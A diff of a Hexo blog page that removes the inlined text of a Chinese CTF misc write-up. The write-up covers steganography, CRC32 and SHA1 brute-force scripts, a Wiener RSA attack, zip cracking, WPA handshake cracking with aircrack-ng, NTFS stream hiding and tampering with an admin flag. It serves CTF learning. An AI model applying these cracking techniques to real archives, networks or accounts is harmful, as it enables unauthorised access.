@@ -350,11 +350,16 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>文章发在SKSEC公众号：【表哥有话说 第27期】</p>
-<p>文章链接：</p>
-<p><a href="https://mp.weixin.qq.com/s?__biz=MzU1MjI5MDY3Nw==&mid=2247484044&idx=1&sn=8cfa3b32f3ef13de16beebd4a9256910&chksm=fb851296ccf29b80ad7b551a5c78d10a4a7c0571ad5c4e68f042feada72343185012614afded&mpshare=1&scene=23&srcid=#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU1MjI5MDY3Nw==&amp;mid=2247484044&amp;idx=1&amp;sn=8cfa3b32f3ef13de16beebd4a9256910&amp;chksm=fb851296ccf29b80ad7b551a5c78d10a4a7c0571ad5c4e68f042feada72343185012614afded&amp;mpshare=1&amp;scene=23&amp;srcid=#rd</a></p>
-<p>欢迎大家关注SKSEC！</p>
-
+          <p>文章发在SKSEC公众号：【表哥有话说 第27期】</p><p>文章链接：</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1MjI5MDY3Nw==&mid=2247484044&idx=1&sn=8cfa3b32f3ef13de16beebd4a9256910&chksm=fb851296ccf29b80ad7b551a5c78d10a4a7c0571ad5c4e68f042feada72343185012614afded&mpshare=1&scene=23&srcid=#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU1MjI5MDY3Nw==&amp;mid=2247484044&amp;idx=1&amp;sn=8cfa3b32f3ef13de16beebd4a9256910&amp;chksm=fb851296ccf29b80ad7b551a5c78d10a4a7c0571ad5c4e68f042feada72343185012614afded&amp;mpshare=1&amp;scene=23&amp;srcid=#rd</a></p>
+          <!--noindex-->
+          
+            <div class="post-button">
+              <a class="btn" href="/2019/02/24/Think PHP框架漏洞梳理/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -476,318 +481,16 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="一、信息收集与社工"><a href="#一、信息收集与社工" class="headerlink" title="一、信息收集与社工"></a><strong>一、信息收集与社工</strong></h2><p><strong>1.签到</strong></p>
-<p>微信扫面二维码回复：<code>flag</code>得flag。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543824528660.png" alt></p>
-<p><strong>2.猜</strong></p>
-<p>提示是某人姓名全拼音，运用谷歌识图搜到是liuyifei。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543828399284.png" alt></p>
-<h2 id="二、编码分析"><a href="#二、编码分析" class="headerlink" title="二、编码分析"></a><strong>二、编码分析</strong></h2><p><strong>1.多种方法解决</strong></p>
-<p>用NotePad++打开发现是python的b64img模块把图片转换成文本的文本。直接在线还原base64编码的图片的二维码，扫面得flag</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543837028259.png" alt></p>
-<p><strong>2.普通的二维码</strong></p>
-<p>扫码说：flag就在这里。各种分析方法发现都没用。最后在文本最后发现一串数字</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544171590468.png" alt></p>
-<p>没有8，应该是八进制然后把八进制转换成字符应该是flag，每三个数字一组写个脚本。</p>
-<p>c = ‘146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175’<br>flag = ‘’<br>for i in xrange(0,126,3):<br>    flag += chr(int(c[i:i+3],8))<br>    print flag</p>
-<p>运行脚本得到flag</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544173317039.png" alt></p>
-<p><strong>3.convert</strong></p>
-<p>写个脚本把二进制转换成字符存到一个新文件</p>
-<p>import libnum<br>​<br>file = open(‘1.txt’,’r’)<br>​<br>f = file.read()<br>c = f.replace(‘\r\n’,’’)<br>m = libnum.b2s(c)<br>print m<br>​<br>getflag = open(‘flag’,’wb’)<br>getflag.write(m)<br>file.close<br>getflag.close<br>print ‘ok！！！’</p>
-<p>在linux里面直接检查到文件格式为rar</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544250350762.png" alt></p>
-<p>解压图片查看exif找到base64字符，python解码base64即可得flag</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544250436728.png" alt></p>
-<p><strong>4.就五层你能解开吗</strong></p>
-<p>感觉这个题目多为密码题，就放这里吧…</p>
-<p>给出了提示：第一层为CRC32碰撞</p>
-<p>打开压缩包可以看见CRC32校验码分别为：<code>0x7c2df918、0xa58a1926、0x4dad5967</code>分别爆破</p>
-<p>把有意义的连接起来得到解压密码：<code>_CRC32_i5_n0t_s4f3</code></p>
-<p>第二层为维吉尼亚密码，给出了key和Hint。但是KEY有点多</p>
-<p>看网上有人说猜测开头字母可能是什么然后猜是the，对应开头秘钥为<code>YEWCQGEWCYBNHDHPXOYUBJJPQIRAPSOUIYEOMTSV</code>解密找到秘密</p>
-<p>第三层SHA1碰撞</p>
-<p>上python脚本</p>
-<p>#encoding:utf-8<br>import string<br>import hashlib<br>​<br>keys = string.ascii_letters + string.digits + string.punctuation<br>​<br>def sha1(s):<br>•    sha1_hash = hashlib.sha1()<br>•    sha1_hash.update(s)<br>•    return sha1_hash.hexdigest()<br>​<br>for i in keys:<br>•   for j in keys:<br>•       for p in keys:<br>•           for q in keys:<br>•               password = i + ‘7’ + j + ‘5-‘ + p + ‘4’ + q + ‘3?’<br>•               sha = sha1(password.encode(‘utf-8’))<br>•               if sha[0:7] == ‘619c20c’ and sha[8] == ‘a’ and sha[16] == ‘9’:<br>•                   print(password)</p>
-<p>得到解压密码</p>
-<p>第四层md5相同文件不同</p>
-<p>百度就能找到<code>HelloWorld-colliding.exe</code>和<code>GoodbyeWorld-colliding.exe</code>两个文件不同但是md5值相同。得到解压密码：<code>Goodbye World :-(</code></p>
-<p>第五层RSA解密</p>
-<p>得到两个文件<code>.enc</code>和<code>.pem</code></p>
-<p>解法一：直接用RSA-Tool快速解题</p>
-<p>解法二：</p>
-<p>用Openssl提取N和E，发现都很大。应该是维纳攻击（低解密指数攻击）</p>
-<p>然后用Wienerattack攻击的脚本跑一下得到d=<code>8264667972294275017293339772371783322168822149471976834221082393409363691895</code></p>
-<p>然后用python的rsatool生成私钥。这里有个问题，脚本比较老用的gmpy。而我不知道为何始终没有解决安装老的gmpy库，最后是把脚本里面的gmpy全部改成gmpy2就好了。</p>
-<p>用Openssl和私钥解密得到flag</p>
-<p><code>openssl rsautl -decrypt -in flag.enc -inkey key.pem -out flag.txt</code></p>
-<h2 id="三、取证隐写"><a href="#三、取证隐写" class="headerlink" title="三、取证隐写"></a><strong>三、取证隐写</strong></h2><h3 id="一-、图片隐写"><a href="#一-、图片隐写" class="headerlink" title="(一)、图片隐写"></a>(一)、图片隐写</h3><p><strong>1.这是一张单纯的图片</strong></p>
-<p>用NotePad++打开发现最后附加了一段Unicode编码。解码得flag</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543824474222.png" alt></p>
-<p><strong>2.隐写</strong></p>
-<p>PNG图片，NotePad++打开后发现有一段IHDR字样。</p>
-<p>猜测是利用Window忽略CRC检验码然后修改高度和宽度后仍然可以显示来隐藏信息。</p>
-<p>然后我们放到Kali linux下面，果然无法显示（Linux会检验CRC检验码）</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543825089090.png" alt></p>
-<p>然后用01Editor打开修改IHDR后面的后八位（前四位为长，后四位为宽）把后四位的A4改为F4，即改为正方形，保存显示flag。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543825123269.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543824985594.png" alt></p>
-<p><strong>3.啊嗒</strong></p>
-<p>省赛题目，前面写过wp就不写了。答题思路就是binwalk分析分离压缩包，通过exif信息找到压缩包密码解压即可。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543827532301.png" alt></p>
-<p><strong>4.又一张图片，还单纯吗</strong></p>
-<p>binwalk分析有很多夹杂的信息，用Foremost提取一下，直接提取出flag图像。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543828038905.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543828054055.png" alt></p>
-<p><strong>5.隐写2</strong></p>
-<p>首先用NotePad++打开文件，最后发现flag.rar</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543829330373.png" alt></p>
-<p>binwalk分析，foremost分离。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543829428485.png" alt></p>
-<p>打开压缩包发现又一个flag.rar和一个提示jpg</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543829494986.png" alt></p>
-<p>根据提示是3位数密码，然后公共爆破工具爆破得到密码。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543829653277.png" alt></p>
-<p>解压得到一张图片，然后用Notepad++打开，最后找到flag</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543829751414.png" alt></p>
-<p><strong>6.闪的好快</strong></p>
-<p>gif图片，很多张二维码不停跳，用StegSolve的Frame Brower打开一个个扫拼接得到flag。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543837917506.png" alt></p>
-<p>最后扫描完拼接得:SYC{F1aSh_so_f4sT}</p>
-<p><strong>7.隐写3</strong></p>
-<p>下载压缩得到PNG图片，用010Editor打开发现IHDR。观察图片感觉明显窄很多。修改高度得到flag。（原理同2.隐写）</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543840471578.png" alt></p>
-<p><strong>8.细心的大象</strong></p>
-<p>图片的文件exif有信息，但是不是flag。然后在kali linux下binwalk分析发现有RAR压缩包，foremost分离</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543844199597.png" alt></p>
-<p>发现一个加密的压缩包，这个时候就用到exif里面的备注了。当时直接当密码不行。需要base64解密才可以。解密后得到一张图片</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543844435915.png" alt></p>
-<p>貌似很熟悉的样子。上面题目刚做了。然而这次修改高度貌似显示不了，用StegSolve查看得到flag</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543844560293.png" alt></p>
-<p><strong>9.爆照</strong></p>
-<p>Notepad++打开发现文件尾部有一段.gif的信息</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543844648957.png" alt></p>
-<p>binwalk分析，foremost分离得到压缩包</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543844742404.png" alt></p>
-<p>解压后得到一堆88888的未名文件</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543844861251.png" alt></p>
-<p>放到kali里面分析，直接显示为图片，而且很容易发现88有二维码扫面得<code>bilibili</code></p>
-<p>挨个binwalk分析发现88、888、8888存在修改痕迹，且8888里面夹杂zip。</p>
-<p>分离zip发下二维码得到<code>panama</code></p>
-<p>看下888的exif</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543845600846.png" alt></p>
-<p>得到base64，解密得<code>silisili</code></p>
-<p>最后按照顺序连接得到flag</p>
-<p><strong>10.猫片</strong></p>
-<p>png图片。下载后常规分析：搜索、查看exif、二进制分析、CRC校验都无果。</p>
-<p>提示：LSB、BRG（有错误，估计打错了，应该是BGR）、NTFS</p>
-<p>用StegSolve打开LSB最低位通道查看，发现BGR里面数据是PNG图片的数据</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543918781149.png" alt></p>
-<p>Save Bin后用010Editor打开，发现不行。用WinHex就可以。把开头四字节删了保存，发现了一半二维码。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543919132325.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543919182673.png" alt></p>
-<p>放到linux里面看一下是否存在CRC校验失败（判断是否修改了高度）。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543919242255.png" alt></p>
-<p>果然，修该高度后找到全的二维码</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543919305330.png" alt></p>
-<p>但是貌似有一点莫名的异样。原来是黑白正好相反。通过StegSolve就可以查看xor后的图像了，扫面后是一个网盘，下载flag.rar</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543919434141.png" alt></p>
-<p>没有flag。但是我们还有一条信息没用到：NTFS。猜测应该是NTFS隐写</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543919582260.png" alt></p>
-<p>用NSE打开扫描发现确实</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543919709886.png" alt></p>
-<p>是个pyc文件，关于pyc文件我之前写过。就是编译后的py文件，在线反编译一下得到源代码</p>
-<p>import base64<br>​<br>def encode():<br>    flag = ‘<strong><strong>*****</strong></strong>‘<br>    ciphertext = []<br>    for i in range(len(flag)):<br>        s = chr(i ^ ord(flag[i]))<br>        if i % 2 == 0:<br>            s = ord(s) + 10<br>        else:<br>            s = ord(s) - 10<br>        ciphertext.append(str(s))  </p>
-<p>​  </p>
-<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> ciphertext\[::-<span class="number">1</span>\]</span><br></pre></td></tr></table></figure>
-
-<p>ciphertext = [‘96’,’65’,’93’,’123’,’91’,’97’,’22’,’93’,’70’,’102’,’94’,’132’,’46’,’112’,’64’,’97’,’88’,’80’,’82’,’137’,’90’,’109’,’99’,’112’]</p>
-<p>写一个解密脚本解密得到flag</p>
-<p># -<em>- codeing: UTF-8 -</em>-<br>​<br>import base64<br>​<br>def decode():<br>    ciphertext = [‘96’,’65’,’93’,’123’,’91’,’97’,’22’,’93’,’70’,’102’,’94’,’132’,’46’,’112’,’64’,’97’,’88’,’80’,’82’,’137’,’90’,’109’,’99’,’112’]<br>    flag = ‘’<br>    ciphertext.reverse() #因为加密用到了append()函数<br>    for i in range(len(ciphertext)):<br>        if i % 2 == 0:<br>            s = int(ciphertext[i]) - 10<br>        else:<br>            s = int(ciphertext[i]) + 10<br>        s = chr(i ^ s)<br>        flag += s<br>    return flag<br>​<br>def main():<br>    flag = decode()<br>    print flag<br>​<br>if __name__ == ‘__main__‘:<br>    main()</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543929282913.png" alt></p>
-<p><strong>11.多彩</strong></p>
-<p>下载后图片名字是：lipstick。翻译是口红的意思…</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544148859969.png" alt></p>
-<p>结合图片颜色应该是不同的口红色号吧</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544148908160.png" alt></p>
-<p>用StegSolve打开后找到这么一段信息</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544148965210.png" alt></p>
-<p>这些口红颜色和YSL什么关系？搜一下发现是一个口红的品牌。继续搜索信息发现LSB最低位里面有PK字段，应该是压缩包数据。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544149165067.png" alt></p>
-<p>果断保存二进制为.zip格式。但是打不开，因为后面有一堆没有的数据。用binwalk分离一下就好了。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544149271033.png" alt></p>
-<p>分离出来发现是个加密的压缩包。那么秘密是什么？和YSL口红色号有什么关系？</p>
-<p>有点脑洞了。搜索后发现是N1CTF国际赛的一道题目。。。秘密啊竟然是YSL对应口红色号的二进制转字符串。。。</p>
-<p>用PS取色：</p>
-<p><code>&#39;BC0B28&#39;,&#39;D04179&#39;,&#39;D47A6F&#39;,&#39;C2696F&#39;,&#39;EB8262&#39;, &#39;CF1A77&#39;,&#39;C0083E&#39;,&#39;BC0B28&#39;,&#39;BC0B28&#39;,&#39;D13274&#39;, &#39;6A1319&#39;,&#39;BC0B28&#39;,&#39;BC0B28&#39;,&#39;D4121D&#39;,&#39;D75B59&#39;, &#39;DD8885&#39;,&#39;CE0A4A&#39;,&#39;D4121D&#39;,&#39;7E453A&#39;,&#39;D75B59&#39;, &#39;DD8885&#39;</code></p>
-<p>进入YSL的网站：<code>https://www.yslbeautyus.com/on/demandware.store/Sites-ysl-us-Site/en_US/Product-Variation?pid=194YSL</code></p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544150813535.png" alt></p>
-<p>可以看见：color=1</p>
-<p>抄个脚本吧..（眼力好也可以手撕）（发现抄的脚本看不懂也运行不了，手撕）</p>
-<p>最后得到色号：<code>1,27 ,59 ,11 ,23 ,7 ,57,1 ,1 ,76 ,222 ,1,1,50 ,214 ,6 ,77 ,50,53,214 ,6</code></p>
-<p>写脚本转换成二进制再转换成和字符</p>
-<p>import libnum<br>​<br>color = [1,27 ,59 ,11 ,23 ,7 ,57,1 ,1 ,76 ,222 ,1,1,50 ,214 ,6 ,77 ,50,53,214 ,6]<br>flag = ‘’<br>for i in color:<br>    flag +=str(bin(i)[2:])<br>print libnum.b2s(flag)</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544152285541.png" alt></p>
-<p>解压得到flag</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544152331729.png" alt></p>
-<p><strong>12.乌云邀请码</strong></p>
-<p>Stegsolve，LSB，BGR分析直接得到flag</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544173874404.png" alt></p>
-<p><strong>13.图穷匕见</strong></p>
-<p>用010Editor打开，根据题目意思应该是在这张图的后面还有数据。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544178148300.png" alt></p>
-<p>FF D9是jpg文件头，提取后面的数据。然后用Notepad++的Converter功能吧16进制转为字符。发现是一堆点。加上提示：问会画图吗？猜测应该是合成二维码。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544178550141.png" alt></p>
-<p>用python的Image库生成反向图片</p>
-<p><strong>14.color</strong></p>
-<p>省赛题目，当时也是没做出来。前面wp也写了。思路就是用SteSolve打开发现隐藏Hint：makemetall。修改高度得到黑白块，联想二进制和ascii码的可打印字符正好是7位（坑点：七张图片要竖着组合01）。</p>
-<p><strong>15.2B</strong></p>
-<p>binwalk分析发现存在zip文件，foremost分离出来</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544265666547.png" alt></p>
-<p>压缩包加密了，用01Editor打开搜索50 4B 01 02，发现是伪加密。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544265914548.png" alt></p>
-<p>修改后解压得到另一张看似一模一样的png图片名字叫B2。猜测双图还是盲水印？答案是盲水印。脚本有两个，一个可以另一个不可以。不知道为啥。。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544266932590.png" alt></p>
-<p><strong>16.妹子的陌陌</strong></p>
-<p>binwalk分析发现存在压缩包，foremost分离出压缩包</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544353069193.png" alt></p>
-<p>压缩包有密码，经过尝试给的信息，竟然是：<code>喜欢我吗.</code>有点脑洞….</p>
-<p>然后摩斯电码解密得到一个网址</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544353804192.png" alt></p>
-<p>进去加上后面的提示，应该是吧有=的看似想base64的用AES解密，而且给出了秘钥。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544353776703.png" alt></p>
-<p>然后进去网站发现二维码，取反色扫描得到flag。</p>
-<h3 id="二-、流量分析"><a href="#二-、流量分析" class="headerlink" title="(二)、流量分析"></a><strong>(二)、流量分析</strong></h3><p><strong>1.talnet</strong></p>
-<p>直接搜索分组字节流，找到flag。也可以过滤talnet协议定位，追踪流找到flag</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543826122662.png" alt></p>
-<h3 id="三-、压缩包分析"><a href="#三-、压缩包分析" class="headerlink" title="(三)、压缩包分析"></a>(三)、压缩包分析</h3><p><strong>1.眼见非实</strong></p>
-<p>Notepad++打开后发现是PK文件头，最后有一段.docx。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543826892182.png" alt></p>
-<p>修改后缀为zip，解压得到.docx文档，但是打不开。</p>
-<p>再用Notepad++打开发现PK头，修改后缀为zip。解压得到文件夹，搜索找到xml文件里面有flag</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543827177315.png" alt></p>
-<p><strong>2.神秘文件</strong></p>
-<p>省赛题目。加密压缩包和压缩包外有相同文件，用ARCHPR明文攻击即可。注意一点要用WinRar。然后解压得到.doc。查看文本发现PK开头，改后缀为zip。找到flag.txt然后base64解码。详解看上面WP</p>
-<p><strong>3.好多压缩包</strong></p>
-<p>这么多<strong>小压缩包</strong>肯定先想到CRC32碰撞攻击。</p>
-<p>原理：</p>
-<p>CRC32:CRC本身是“[冗余校验码](<a href="http://baike.baidu.com/item/CRC32)”的意思，CRC32则表示会产生一个32bit（8位十六进制数）的校验值。" target="_blank" rel="noopener">http://baike.baidu.com/item/CRC32)”的意思，CRC32则表示会产生一个32bit（8位十六进制数）的校验值。</a><br>CRC32校验码出现在很多文件中比如 png 文件，同样 zip 中也有 CRC32 校验码。值得注意的是 zip 中的 CRC32 是未加密文件的校验值。这也就导致了基于 CRC32 的攻击手法<br>在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件的内容<br>限于CPU能力，CRC碰撞只能用于压缩文件较小的情况</p>
-<p>破解脚本：</p>
-<p># coding:utf-8<br>import zipfile<br>import string<br>import binascii<br>import base64<br>​<br>​<br>def CrackCrc(crc):<br>    for i in dic:<br>        for j in dic:<br>            for p in dic:<br>                for q in dic:<br>                    s = i + j + p + q<br>                    if crc == (binascii.crc32(s) &amp; 0xffffffff):<br>                        # print s<br>                        f.write(s)<br>                        return<br>​<br>​<br>def CrackZip():<br>    for I in range(68):<br>        file = ‘out’ + str(I) + ‘.zip’<br>        f = zipfile.ZipFile(file, ‘r’)<br>        GetCrc = f.getinfo(‘data.txt’)<br>        crc = GetCrc.CRC<br>        CrackCrc(crc)<br>​<br>​<br>dic = string.ascii_letters + string.digits + ‘+/=’<br>​<br>f = open(‘out.txt’, ‘w’)<br>CrackZip()<br>f.close()</p>
-<p>爆破完成得到base64</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544261982600.png" alt></p>
-<p>用python脚本解密写进jm.txt里面</p>
-<p>#coding:utf-8<br>import base64<br>​<br>file = open(‘out.txt’,’r’)<br>c = file.read()<br>m = base64.b64decode(c)<br>file = open(‘jm.txt’,’w’)<br>file.write(m)<br>print ok</p>
-<p>用01Editor打开发现Hint：修理文件得flag。而我们在十六进制中发现<code>C4 3D 7B 00 40 07 00</code>查阅得知这是rar文件结尾。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544261947068.png" alt></p>
-<p>新建一个文件，打上rar文件开头十六进制，然后复制前面的数据后保存得到压缩包</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544262304352.png" alt></p>
-<p>注释里面得到flag</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544263080027.png" alt></p>
-<p><strong>4.一个普通的压缩包</strong></p>
-<p>用Winrar打开发现说文件secret.png头被破坏</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544263430582.png" alt></p>
-<p>使用Winrar自动修复功能，对比两个压缩包明显发现大小不一样。但是修复的完全可以解压未修复的假flag.txt猜测第一个压缩包里面藏着secret.png但是文件头被损坏。用binwalk也分析不出来</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544264401647.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544264631178.png" alt></p>
-<p>发现这个地方。A8 3C后面是被压缩文件文件头类型。把7A改成74再解压就得到了secret.png</p>
-<p>用StegSolve打开，在一个通道发现一半二维码。而且存在两帧</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544264826861.png" alt></p>
-<p>应该把第二帧提取出来在一个通道可以找到另一半。保存第二帧找到另一半拼接而且还得补全左上角，扫描得到flag</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544265332045.png" alt></p>
-<h3 id="四-、内存取证"><a href="#四-、内存取证" class="headerlink" title="(四)、内存取证"></a>(四)、内存取证</h3><p><strong>1.Linux</strong></p>
-<p>提示Linux，下载文件是一个不知名的文件。根据提示放到linux下file命令看看</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543839881560.png" alt></p>
-<p>是一个映像文件，我们尝试挂载</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543840137206.png" alt></p>
-<p>找到目录即可找到flag文件</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543840168267.png" alt></p>
-<p><strong>2.linux2</strong></p>
-<p><strong>法一：</strong></p>
-<p>Notepad++直接搜索key得到flag。但是我觉得这个题肯定不是这么做，这是个非预期做法。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543842696247.png" alt></p>
-<p><strong>法二：</strong></p>
-<p>不知名的文件，接近20MB。放linux下file和binwalk分析</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543842443431.png" alt></p>
-<p>和上个题目类似，也是内存镜像。我们尝试挂载，发现一堆文件。观察上图发现一个jpg文件。我们尝试foremost分离得到jpg。然而并不是flag。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543842911880.png" alt></p>
-<p>最后貌似懂了出题人想考什么：应该是考linux的strings命令</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543843090208.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543843073019.png" alt></p>
-<h3 id="五-、音频隐写"><a href="#五-、音频隐写" class="headerlink" title="(五)、音频隐写"></a>(五)、音频隐写</h3><p><strong>1.旋转跳跃</strong></p>
-<p>MP3文件，听一下（真好听）。关于MP3的除了曲线就是MP3隐写了。用工具MP3Stego分析得到flag</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544170752898.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544170769529.png" alt></p>
-<p><strong>2.听首音乐</strong></p>
-<p>用Audacity打开后发现</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544247374917.png" alt></p>
-<p>放大</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544247395610.png" alt></p>
-<p>这就很容易猜想了。三种状态：<code>点、短横、空格</code>正好对应摩斯电码的三种符号：<code>.-/</code></p>
-<p>手撕电码解密得flag</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1544247504314.png" alt></p>
-<p><strong>3.PEN_AND_APPLE</strong></p>
-<p>NTFS流隐写，一种以前木马的隐藏方式</p>
-<p>隐藏方法：<code>type flag.png&gt;pen_and_apple.mp4</code></p>
-<p>查看方法：<code>dir /r</code></p>
-<h2 id="四、Other"><a href="#四、Other" class="headerlink" title="四、Other"></a><strong>四、Other</strong></h2><p><strong>1.宽带信息泄露</strong></p>
-<p>给出一个.bin二进制文件，但是不知道什么生成的。根据题目提示用RouterPassView打开，搜索username找到flag。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543829157825.png" alt></p>
-<p><strong>2.come_game</strong></p>
-<p>提示通关就有flag。下载后发现是一个exe的小游戏，既然放在MISC应该不会用到Re。随便玩一玩发现很难通关，不可能通关玩。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543839511645.png" alt></p>
-<p>退出后生成了一个save1文件，猜测应该是存盘。这样的话我们把存的关数修改不就可以通关了吗？用010Eeditor打开修改数字2，一个个修改。最后到5的时候打开游戏就是通关了。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543839576931.png" alt></p>
-<p><strong>3.做个游戏</strong></p>
-<p>提示坚持六十秒，同上个题目差不多。不可能达到他的要求。jar文件我们尝反编译查看源码找到flag。</p>
-<p>符强大的java在线反编译网址：<code>http://www.javadecompilers.com/</code></p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543841153496.png" alt></p>
-<p><strong>4.想蹭网先解开密码</strong></p>
-<p>给了个.cap流量包，用wireshark打开。提示WIFI密码，WIFI连接认证的重点在WPA的四次握手包，也就是eapol协议的包，过滤一下</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543841548020.png" alt></p>
-<p>正好四个包。接下来根据提示写个字典。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543841689953.png" alt></p>
-<p>通过kali里面的aircrack-ng破解就可以得到key了，key就是flag了。</p>
-<p><img src="https://raw.githubusercontent.com/xx-C1/MDphoto/master/1543841797798.png" alt></p>
-<p><strong>6.账号被盗了</strong></p>
-<p>不抓包直接getflag提示you are not admin！ 抓包把flase改成true。得到连接，访问下载exe文件。</p>
